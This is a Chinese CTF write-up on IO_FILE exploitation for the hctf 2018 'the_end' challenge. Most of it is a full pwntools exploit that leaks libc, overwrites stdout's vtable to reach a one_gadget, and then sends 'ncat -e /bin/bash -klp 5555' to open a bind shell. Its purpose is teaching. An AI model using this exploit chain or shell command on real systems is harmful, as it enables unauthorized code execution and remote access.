---
title: 浅析 IO_FILE 利用
categories:
  - linux_pwn
tags:
  - Null
---

`IO_FILE` 是一个很重要的技巧，在 `pwn` 中给我们提供一个其他 `GetShell` 的思路。



# 0x1 漏洞原理

暂无





# 0x2 漏洞利用



## 0x21 hctf 2018 - the_end && fake vtable

日常 `checsec` 一下：

```sh
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

看到这里心里咯噔一下，难道是个栈溢出？



### 程序分析

事实证明我想多了，流程图如下：

![the_end_flow_chart](/image/2019-04-07-linux_pwn_io_file/the_end_flow_chart.jpg)

这里条件限制的很死啊，最多可以给一个地址写五个字节，改返回地址已经不怎么现实了，找找 `exit` 函数有什么可以利用的吧。

![exit_process](/image/2019-04-07-linux_pwn_io_file/exit_process.jpg)

### 程序利用

看到这里，怎么利用，基本就呼吁而出了，我们可以通过更改 `stderr` 或者 `stdout` 的 `vtable` 表使其指向我们可控的地址，然后在新 `vtable` 更改所对应的函数位置即可。



`poc` ：

```python
# -*- coding: utf-8 -*-
# !/usr/bin/python env
from pwn import *


def changed_content(exp_file, change_addr, change_value):
    print(hex(ord(change_value)))
    exp_file.send(p64(change_addr)+change_value)


def main():
    debug = 0
    if debug:
        exp_file = process("/home/who/Desktop/the_end")
    else:
        exp_file = remote("127.0.0.1", 9999)
    libc_file = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    one_gadget_offset = 0xf02b0
    
    # Get base address of libc
    sleep_addr = int(exp_file.recvuntil(";)", drop=True).split("here is a gift ")[1][:14], 16)
    libc_addr = sleep_addr - libc_file.symbols['sleep']
    one_gadget_addr = libc_addr + one_gadget_offset
    stdout_addr = libc_addr + libc_file.symbols['_IO_2_1_stdout_']
    stout_old_vtable = stdout_addr + 0xd8
    stderr_addr = libc_addr + libc_file.symbols['__malloc_hook']
    stdout_new_vatble = stderr_addr - 0x68
    log.info("sleep_addr:{addr}".format(addr=hex(sleep_addr)))
    log.info("libc_addr:{addr}".format(addr=hex(libc_addr)))
    log.info("stdout_addr :{addr}".format(addr=hex(stdout_addr)))
    log.info("stout_old_vtable :{addr}".format(addr=hex(stout_old_vtable)))
    log.info("one_gadget_addr:{addr}".format(addr=hex(one_gadget_addr)))
    log.info("stdout_new_vatble:{addr}".format(addr=hex(stdout_new_vatble)))

    # Change stdout_vtable to __malloc_hook - 0x68
    changed_content(exp_file, stout_old_vtable, chr(int(hex(stdout_new_vatble)[12:], 16)))
    changed_content(exp_file, stout_old_vtable+1, chr(int(hex(stdout_new_vatble)[10:12], 16)))
    
    # Change vtable->setvbuf to onegadget
    changed_content(exp_file, stdout_new_vatble+0x58, chr(int(hex(one_gadget_addr)[12:], 16)))
    changed_content(exp_file, stdout_new_vatble+0x59, chr(int(hex(one_gadget_addr)[10:12], 16)))
    changed_content(exp_file, stdout_new_vatble+0x5a, chr(int(hex(one_gadget_addr)[8:10], 16)))

    # Now, we get shell!
    exp_file.sendline("ncat -e /bin/bash -klp 5555")
    exp_file.interactive()


if __name__ == '__main__':
    main()
```

